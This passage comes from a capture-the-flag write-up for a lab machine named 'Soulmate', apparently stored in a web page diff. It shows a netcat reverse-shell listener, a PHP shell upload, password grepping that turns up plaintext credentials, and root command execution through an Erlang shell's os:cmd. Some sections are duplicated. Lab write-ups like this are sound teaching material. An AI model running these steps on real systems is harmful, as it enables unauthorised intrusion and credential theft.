`ben`.\n![soulmate_4](/assets/soulmate/soulmate_4.jpg)\n\n- Now possible to upload files directly to WebProd directory.\n\n![soulmate_5](/assets/soulmate/soulmate_5.jpg)\n\n---\n\n**Reverse Shell Setup:**\n```shell\nnc -nvlp 9001\n```\n\n- Interact with uploaded shell at soulmate.htb/shell_name.php\n\n---\n#### TTY Upgrade\n```python\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\nCtrl-Z\nstty raw -echo; fg\nreset (if needed)\nexport TERM=xterm\n```\n\n### Credential Hunting\n```bash\ngrep -Ri 'password' /usr/local/ 2\u003e/dev/null\n```\n\n```\n\u003cSNIP\u003e\n/usr/local/lib/erlang_login/start.escript:        {auth_methods, \"publickey,password\"},\n/usr/local/lib/erlang_login/start.escript:        {user_passwords, [{\"ben\", \"HouseH0ldings998\"}]},\n\u003cSNIP\u003e\n```\n\n**Credentials Found:**\n```bash\nUsername: ben\nPassword: HouseH0ldings998\n```\n\n---\n\n### SSH Access\n```shell\nssh ben@soulmate.htb\nPassword: HouseH0ldings998\n```\n\n**User Flag:**\n```shell\ncat /home/ben/user.txt\nf708d904\u003cREDACTED\u003e\n```\n\n---\n\n## 4. Privilege Escalation\n\n### System Info\n```bash\nwhoami \u0026\u0026 id\n```\n\n```\nben\nuid=1000(ben) gid=1000(ben) groups=1000(ben)\n```\n\n```bash\nhostname \u0026\u0026 uname -a\n```\n\n```\nLinux soulmate 5.15.0-151-generic #161-Ubuntu SMP Tue Jul 22 14:25:40 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux\n```\n\n---\n\n### SUID \u0026 Capabilities\n```shell\nfind / -perm -4000 -type f 2\u003e/dev/null\n```\n\n```\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/su\n/usr/bin/umount\n/usr/bin/chsh\n/usr/bin/fusermount3\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/chfn\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/libexec/polkit-agent-helper-1\n```\n\n```shell\ngetcap -r / 2\u003e/dev/null\n```\n\n```\n/usr/bin/mtr-packet cap_net_raw=ep\n/usr/bin/ping cap_net_raw=ep\n/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep\n```\n\n**Findings:**\n- No unusual SUID binaries or capabilities found.\n\n---\n\n### Local Services\n```shell\nss -tuln\n```\n\n```\n\u003cSNIP\u003e\ntcp    LISTEN  0   4096   127.0.0.1:8443    0.0.0.0:*\ntcp    LISTEN  0   5      127.0.0.1:2222    0.0.0.0:*\ntcp    LISTEN  0   4096   127.0.0.1:9090    0.0.0.0:*\n\u003cSNIP\u003e\n```\n\n- Erlang/SSH service listening on port 2222.\n\n---\n\n### Erlang Service Exploit\n- Connection via `nc 127.0.0.1 2222` shows protocol error.\n- SSH connection to Erlang service:\n\n```shell\nssh 127.0.0.1 -p 2222\nPassword: HouseH0ldings998\n```\n\n---\n\n### Erlang Service Exploit\n- Connection via `nc 127.0.0.1 2222` shows protocol error, indicating the service expects SSH protocol.\n- SSH connection to Erlang service using Ben's credentials:\n\n```shell\nssh 127.0.0.1 -p 2222\nPassword: HouseH0ldings998\n```\n\n**Erlang Shell Access:**\n```erlang\nEshell V15.2.5 (press Ctrl+G to abort, type help(). for help)\n(ssh_runner@soulmate)1\u003e\n```\n\n**Exploring Shell Capabilities:**\n```erlang\n(ssh_runner@soulmate)1\u003e help().\n\n** shell internal commands **\nb()        -- display all variable bindings\ne(N)       -- repeat the expression in query \u003cN\u003e\nf()        -- forget all variable bindings\n\u003cSNIP\u003e\nos:cmd(Command) -- execute Command in OS shell\n\u003cSNIP\u003e\n\n```\n\n**Listing Loaded Modules:**\n```erlang\n(ssh_runner@soulmate)2\u003e m().\nModule                File\napplication           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application.beam\napplication_controller /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application_controller.beam\n\u003cSNIP\u003e\nos                    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/os.beam\n\u003cSNIP\u003e\n```\n\n**Command Execution as Root:**\n```erlang\n(ssh_runner@soulmate)4\u003e os:cmd(\"whoami\").\n\"root\\n\"\n```\n\n**Root Flag Retrieval:**\n```erlang\n(ssh_runner@soulmate)5\u003e os:cmd(\"cat /root/root.txt\").\n\"79d6192f\u003cREDACTED\u003e\"\n```\n\nThe Erlang shell's `os:cmd/1` function allowed direct execution of system commands with root privileges, providing immediate privilege escalation without requiring additional exploits.\n\n---\n## Conclusions\n\n- **User Access:** Obtained by exploiting CVE-2025-31161 on CrushFTP and modifying Ben's password through management panel.\n- **Privilege Escalation:** Exploited Erlang service listening on port 2222, allowing command execution as root via `os:cmd/1` function.\n- **Key Lessons:**\n  - Update software to mitigate known vulnerabilities (CVE-2025-31161).\n  - Restrict permissions of internal services (Erlang) to prevent privilege escalation.\n  privilege escalation.\n  "}</script>
+    
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "6090182987b5451bb264dcd59cd2b600"}'></script>
+  </body>
+</html>
